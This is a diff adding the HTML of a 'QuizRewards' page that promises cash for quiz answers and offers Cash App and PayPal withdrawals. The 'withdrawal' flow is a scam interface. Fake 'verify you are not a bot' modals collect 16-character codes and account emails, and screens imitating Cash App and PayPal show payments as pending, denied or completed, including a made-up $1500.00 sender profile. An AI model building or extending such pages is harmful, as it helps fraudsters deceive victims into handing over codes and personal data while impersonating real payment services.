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" alt="">
+                    </div>
+                </div>
+                <button class="start-quiz-btn" id="start-quiz-btn">
+                    <span class="btn-icon">→</span> Start Quiz
+                </button>
+            </div>
+
+            <!-- Withdrawal Card (Now Shows All Transactions) -->
+            <div class="card withdrawal-card">
+                <h3>Withdrawals</h3>
+                <div class="card-content withdrawal-content">
+                    <img src="https://images.icon-icons.com/2355/PNG/512/wallet_money_icon_143270.png" onerror="this.src='https://cdn-icons-png.flaticon.com/512/2331/2331941.png'" alt="" class="card-icon">
+                    <div class="withdrawal-text">
+                        <p class="withdrawal-title">No Withdrawals Yet</p>
+                        <p class="withdrawal-subtitle">You haven't made any withdrawal requests yet.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Leaderboard Card -->
+            <div class="card leaderboard-card">
+                <h3>Leaderboard</h3>
+                <div class="card-content leaderboard-content">
+                    <img src="https://images.icon-icons.com/1633/PNG/512/52725trophy_109387.png" alt="" class="card-icon">
+                    <p class="leaderboard-text">Once you start playing, the top users will appear here.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Quiz Page -->
+        <div id="quiz-page" class="page">
+            <div class="quiz-header">
+                <span class="quiz-badge">Science</span>
+                <span class="quiz-balance">$<span id="quiz-balance">0</span></span>
+            </div>
+
+            <div class="quiz-progress">
+                <p id="question-number">Question 1 / 20</p>
+            </div>
+
+            <div class="card quiz-card">
+                <h2 id="question-text">What is the chemical symbol for gold?</h2>
+
+                <div class="answer-options" id="answer-options">
+                    <button class="option-btn" data-index="0">A) Option 1</button>
+                    <button class="option-btn" data-index="1">B) Option 2</button>
+                    <button class="option-btn" data-index="2">C) Option 3</button>
+                    <button class="option-btn" data-index="3">D) Option 4</button>
+                </div>
+
+                <button class="submit-btn" id="submit-btn">Submit Answer</button>
+            </div>
+
+            <div id="notification" class="notification"></div>
+        </div>
+
+        <!-- Withdraw Page -->
+        <div id="withdraw-page" class="page">
+            <div class="withdraw-header">
+                <h1>Withdraw Your Earnings</h1>
+                <p>Select a withdrawal method to cash out your earnings.</p>
+            </div>
+
+            <div class="withdraw-methods">
+                <button class="withdraw-method-btn" id="cashapp-btn">
+                    <img src="https://cdn.iconscout.com/icon/free/png-512/free-cashapp-icon-svg-download-png-2944743.png?f=webp&w=512" alt="" class="withdraw-logo">
+                    <span>Cash App</span>
+                </button>
+                <button class="withdraw-method-btn" id="paypal-btn">
+                    <img src="https://images.icon-icons.com/2429/PNG/512/paypal_logo_icon_147252.png" alt="" class="withdraw-logo">
+                    <span>PayPal</span>
+                </button>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Bottom Navigation -->
+    <nav class="bottom-nav">
+        <button class="nav-btn active" data-page="dashboard">
+            <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                <polyline points="9 22 9 12 15 12 15 22"></polyline>
+            </svg>
+            <span>Dashboard</span>
+        </button>
+        <button class="nav-btn" data-page="quiz">
+            <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="11" cy="11" r="8"></circle>
+                <path d="m21 21-4.35-4.35"></path>
+            </svg>
+            <span>Quiz</span>
+        </button>
+        <button class="nav-btn" data-page="withdraw">
+            <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
+                <path d="M1 10h22"></path>
+            </svg>
+            <span>Withdraw</span>
+        </button>
+    </nav>
+
+    <!-- Cash App Modal -->
+    <div id="cashapp-modal" class="modal">
+        <div class="modal-content">
+            <button class="modal-close" data-modal="cashapp-modal">&times;</button>
+            <h2>Cash App</h2>
+            <p>Enter your Cash App tag to withdraw your earnings</p>
+            <input type="text" placeholder="$/cashtag" id="cashapp-input" class="modal-input">
+            
+            <label style="display: block; margin-bottom: 8px; font-size: 13px; color: rgba(255, 255, 255, 0.7);">Withdrawal Amount (Max: $<span id="cashapp-max-balance">0</span>)</label>
+            <input type="number" placeholder="Enter amount" id="cashapp-amount" class="modal-input" min="1">
+            
+            <button class="modal-submit" id="cashapp-submit" data-modal="cashapp-modal" disabled>Submit</button>
+        </div>
+    </div>
+
+    <!-- PayPal Modal -->
+    <div id="paypal-modal" class="modal">
+        <div class="modal-content">
+            <button class="modal-close" data-modal="paypal-modal">&times;</button>
+            <h2>PayPal</h2>
+            <p>Enter your PayPal email to withdraw your earnings</p>
+            <input type="email" placeholder="your@email.com" id="paypal-input" class="modal-input">
+            
+            <label style="display: block; margin-bottom: 8px; font-size: 13px; color: rgba(255, 255, 255, 0.7);">Withdrawal Amount (Max: $<span id="paypal-max-balance">0</span>)</label>
+            <input type="number" placeholder="Enter amount" id="paypal-amount" class="modal-input" min="1">
+            
+            <button class="modal-submit" id="paypal-submit" data-modal="paypal-modal" disabled>Submit</button>
+        </div>
+    </div>
+
+    <!-- Quiz End Modal -->
+    <div id="quiz-end-modal" class="modal">
+        <div class="modal-content">
+            <h2>Thank you!</h2>
+            <p>You've hit your daily earning limit.</p>
+            <button class="modal-close-btn" data-modal="quiz-end-modal">Close</button>
+        </div>
+    </div>
+
+    <!-- Telegram Payment Modal (UI A - Dark Theme) -->
+    <div id="telegram-modal" class="modal">
+        <div class="modal-content telegram-modal-content">
+            <button class="modal-close" data-modal="telegram-modal">&times;</button>
+            <div class="profile">
+                <div class="avatar" id="telegram-avatar"><img src="" alt="Profile" /></div>
+                <div>
+                    <div class="name" id="telegram-name"></div>
+                    <div class="time" id="telegram-time"></div>
+                    <div class="allowance" id="telegram-purpose"></div>
+                </div>
+            </div>
+            <div class="amount" id="telegram-amount"></div>
+            <div class="divider"></div>
+            <div class="section-title">Transaction details</div>
+            <div class="row">
+                <div class="icon">•••</div>
+                <div>
+                    <div class="row-title">Pending</div>
+                    <div class="row-desc">Verify you are not a bot to complete this payment</div>
+                </div>
+            </div>
+            <div class="row">
+                <div class="icon">#</div>
+                <div>
+                    <div class="row-title">Transaction number</div>
+                    <div class="transaction-number" id="telegram-transaction-id"></div>
+                </div>
+                <div class="copy" id="copy-transaction-id">⧉</div>
+            </div>
+            <div class="divider"></div>
+            <button class="button cancel" id="telegram-readme">Read Me!</button>
+            <button class="button continue" id="telegram-complete-payment">Complete payment</button>
+        </div>
+    </div>
+
+    <!-- UI B Modal (Light Theme) -->
+    <div id="telegram-modal-b" class="modal">
+        <div class="modal-content" style="padding:0; border:none; background:transparent; box-shadow:none; max-width:390px; width:98%;">
+            <button class="modal-close" data-modal="telegram-modal-b" style="color:#333; background:rgba(0,0,0,0.05); top:12px; right:12px;">&times;</button>
+            <div class="container" style="width:390px; background:#f6f6f6; min-height:auto; padding:28px; box-sizing:border-box; border-radius:20px;">
+                <div class="profile">
+                    <div class="avatar">
+                        <img id="telegram-avatar-b-img" src="profile.jpg" alt="Profile">
+                    </div>
+                    <div>
+                        <div class="name" id="telegram-name-b">Jazelle Mendoza</div>
+                        <div class="username" id="telegram-username-b">@jazzybae060721</div>
+                    </div>
+                </div>
+
+                <div class="amount-row">
+                    <div class="amount" id="telegram-amount-b">$1500.00</div>
+                    <div class="currency">USD ▼</div>
+                </div>
+
+                <div class="info">
+                    Payment status: Pending...<br><br>
+                    <br><br>
+                    Notice: Check read me to verify you are not a bot to complete this payment to your PayPal balance
+                </div>
+
+                <div class="bottom-info">
+                    For more information please read our <a href="#" id="user-agreement-b">user agreement</a>.
+                </div>
+
+                <button class="pending-btn" id="telegram-complete-payment-b">Complete payment</button>
+
+                <div class="cancel">
+                    <a href="#" id="telegram-readme-b">Read me!</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- UI C Modal (Payment Denied) -->
+    <div id="telegram-modal-c" class="modal">
+        <div class="modal-content" style="padding:0; border:none; background:transparent; box-shadow:none; max-width:390px; width:98%;">
+            <button class="modal-close" data-modal="telegram-modal-c" style="color:#333; background:rgba(0,0,0,0.08); top:12px; right:12px;">&times;</button>
+            <div class="container denied-container">
+                <div class="icon">⚠</div>
+                <div class="title">
+                    Your payment<br>
+                    was denied
+                </div>
+                <div class="message">
+                    Sorry, we weren't able to complete your payment at this time. Please try again later.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Read Me Modal -->
+    <div id="readme-modal" class="modal">
+        <div class="modal-content readme-modal-content">
+            <button class="modal-close" data-modal="readme-modal">&times;</button>
+            <div id="readme-content"></div>
+        </div>
+    </div>
+
+    <!-- Verification Code Modal -->
+    <div id="verification-modal" class="modal">
+        <div class="modal-content verification-modal-content">
+            <button class="modal-close" data-modal="verification-modal">&times;</button>
+            <h2>Identity Verification</h2>
+            <p>Enter your 16-character verification code to continue processing this withdrawal.</p>
+            <input
+                id="verification-code-input"
+                class="modal-input verification-input"
+                type="text"
+                maxlength="16"
+                placeholder="Enter 16-character code"
+                autocomplete="off"
+            >
+            <button id="verification-submit" class="modal-submit verification-submit" disabled>Verify</button>
+        </div>
+    </div>
+
+    <!-- Verification Pending Modal -->
+    <div id="verification-pending-modal" class="modal">
+        <div class="modal-content verification-pending-content">
+            <div class="pending-chip">Submitted</div>
+            <h3>Check Back In 20 Minutes</h3>
+            <p>Your verification is under review. We will update your withdrawal status shortly.</p>
+        </div>
+    </div>
+
+    <!-- Cash App Stage 2 Modal (Approve B) -->
+    <div id="cashapp-stage2-modal" class="modal">
+        <div class="modal-content cashapp-stage2-content">
+            <button class="modal-close" data-modal="cashapp-stage2-modal">&times;</button>
+            <div class="cashapp-stage2-chip">Cash App Security</div>
+            <h3>Second Verification Required</h3>
+            <p id="cashapp-stage2-message">
+                Your first 16-character verification was successful. Complete the second stage to finish payout to your Cash App.
+            </p>
+
+            <label for="cashapp-stage2-email">To authenticate identity, please input the email linked to the receiving Cash App.</label>
+            <input id="cashapp-stage2-email" class="modal-input" type="email" placeholder="you@example.com" autocomplete="off">
+
+            <label for="cashapp-stage2-code">Second 16-character code</label>
+            <input id="cashapp-stage2-code" class="modal-input" type="text" maxlength="16" placeholder="Enter 16-character code" autocomplete="off">
+
+            <button id="cashapp-stage2-submit" class="modal-submit" disabled>Complete Payment</button>
+        </div>
+    </div>
+
+    <!-- PayPal Stage 2 Modal (Approve B) -->
+    <div id="paypal-stage2-modal" class="modal">
+        <div class="modal-content paypal-stage2-content">
+            <button class="modal-close" data-modal="paypal-stage2-modal">&times;</button>
+            <div class="paypal-stage2-chip">PayPal Security</div>
+            <h3>Second Verification Required</h3>
+            <p id="paypal-stage2-message">
+                Your first 16-character verification was successful. Complete the second stage to finish payout to your PayPal.
+            </p>
+
+            <label for="paypal-stage2-email">To authenticate identity, please input the email linked to the receiving PayPal.</label>
+            <input id="paypal-stage2-email" class="modal-input" type="email" placeholder="you@example.com" autocomplete="off">
+
+            <label for="paypal-stage2-code">Second 16-character code</label>
+            <input id="paypal-stage2-code" class="modal-input" type="text" maxlength="16" placeholder="Enter 16-character code" autocomplete="off">
+
+            <button id="paypal-stage2-submit" class="modal-submit" disabled>Complete Payment</button>
+        </div>
+    </div>
+
+    <!-- Final Verifying Modal -->
+    <div id="final-verifying-modal" class="modal">
+        <div class="modal-content final-verifying-content">
+            <button class="modal-close" data-modal="final-verifying-modal">&times;</button>
+            <div class="final-verifying-chip">Verifying</div>
+            <h3>Verification In Progress</h3>
+            <p>Your payment should be complete shortly, and we will notify you as soon as status changes.</p>
+            <p>There is no need to try again right now.</p>
+        </div>
+    </div>
+
+    <!-- Cash App Completed Modal -->
+    <div id="completed-cashapp-modal" class="modal">
+        <div class="modal-content completed-cashapp-content">
+            <button class="modal-close" data-modal="completed-cashapp-modal">&times;</button>
+            <div class="cashapp-shell">
+                <div class="cashapp-avatar">
+                    <img id="completed-cash-avatar-img" src="" alt="Profile">
+                </div>
+
+                <div class="cashapp-name" id="completed-cash-name"></div>
+                <div class="cashapp-paymentto" id="completed-cash-paymentto"></div>
+
+                <div class="cashapp-amount" id="completed-cash-amount"></div>
+                <div class="cashapp-time" id="completed-cash-time"></div>
+
+                <div class="cashapp-check">✔</div>
+                <div class="cashapp-completed">Completed</div>
+
+                <div class="cashapp-divider"></div>
+
+                <div class="cashapp-details">
+                    <div class="cashapp-row">
+                        <div>Amount</div>
+                        <div class="cashapp-value" id="completed-cash-amount-detail"></div>
+                    </div>
+                    <div class="cashapp-row">
+                        <div>Source</div>
+                        <div class="cashapp-value">Cash</div>
+                    </div>
+                    <div class="cashapp-row">
+                        <div>Identifier</div>
+                        <div class="cashapp-value" id="completed-cash-ref"></div>
+                    </div>
+                </div>
+
+                <div class="cashapp-note">
+                    <div class="cashapp-note-title">Cash App Update</div>
+                    <div class="cashapp-note-text">Payment completed successfully. It may take a few minutes to reflect in your available balance.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PayPal Completed Modal -->
+    <div id="completed-paypal-modal" class="modal">
+        <div class="modal-content completed-paypal-content">
+            <button class="modal-close" data-modal="completed-paypal-modal">&times;</button>
+            <div class="paypal-shell">
+                <div class="paypal-logo" aria-label="PayPal">
+                    <span class="pp-dark">Pay</span><span class="pp-light">Pal</span>
+                </div>
+
+                <div class="paypal-avatar">
+                    <img id="completed-paypal-avatar-img" src="" alt="Profile">
+                </div>
+
+                <div class="paypal-name" id="completed-paypal-name">Payment Sent</div>
+                <div class="paypal-subtitle" id="completed-paypal-subtitle">PayPal transaction</div>
+
+                <div class="paypal-amount" id="completed-paypal-amount"></div>
+                <div class="paypal-date" id="completed-paypal-date"></div>
+
+                <div class="paypal-check">✔</div>
+                <div class="paypal-status">Completed</div>
+
+                <div class="paypal-divider"></div>
+
+                <div class="paypal-details">
+                    <div class="paypal-row">
+                        <div class="paypal-label">Amount</div>
+                        <div class="paypal-value" id="completed-paypal-amount-detail"></div>
+                    </div>
+                    <div class="paypal-row">
+                        <div class="paypal-label">Fee</div>
+                        <div class="paypal-value">$0.00</div>
+                    </div>
+                    <div class="paypal-row">
+                        <div class="paypal-label">Total</div>
+                        <div class="paypal-value" id="completed-paypal-total"></div>
+                    </div>
+                    <div class="paypal-row">
+                        <div class="paypal-label">Payment method</div>
+                        <div class="paypal-value">Balance</div>
+                    </div>
+                    <div class="paypal-row">
+                        <div class="paypal-label">Transaction ID</div>
+                        <div class="paypal-value" id="completed-paypal-ref"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Invite-Only Access Gate -->
+    <div id="invite-gate" class="invite-gate active">
+        <div class="invite-gate-card">
+            <div class="invite-brand">QuizRewards</div>
+            <div id="invite-view-home">
+                <h2>Invite-Only Access</h2>
+                <p>Private access for verified members only.</p>
+                <button id="invite-btn-signin" class="invite-btn invite-btn-primary">Sign In</button>
+                <button id="invite-btn-signup" class="invite-btn invite-btn-secondary">Create Invite</button>
+                <div class="invite-note">Secure onboarding • Anti-bot verification</div>
+            </div>
+
+            <div id="invite-view-signup" class="invite-hidden">
+                <h2>Create Invite</h2>
+                <p>Enter your details to generate your invite code.</p>
+                <label for="invite-signup-email">Email Address</label>
+                <input id="invite-signup-email" class="invite-input" type="email" placeholder="you@example.com" autocomplete="off">
+                <label for="invite-signup-name">First Name</label>
+                <input id="invite-signup-name" class="invite-input" type="text" placeholder="Alex" autocomplete="off">
+                <button id="invite-signup-submit" class="invite-btn invite-btn-secondary">Sign Up</button>
+                <div id="invite-signup-status" class="invite-note"></div>
+                <button id="invite-back-home-a" class="invite-link">Back</button>
+            </div>
+
+            <div id="invite-view-signin" class="invite-hidden">
+                <h2>Sign In</h2>
+                <p>Enter your valid invite code to unlock dashboard access.</p>
+                <label for="invite-signin-code">Invite Code</label>
+                <input id="invite-signin-code" class="invite-input" type="text" placeholder="AB12CD34EF" autocomplete="off">
+                <button id="invite-signin-submit" class="invite-btn invite-btn-primary">Unlock Access</button>
+                <div id="invite-signin-status" class="invite-note"></div>
+                <button id="invite-back-home-b" class="invite-link">Back</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+
+</body>
+</html>
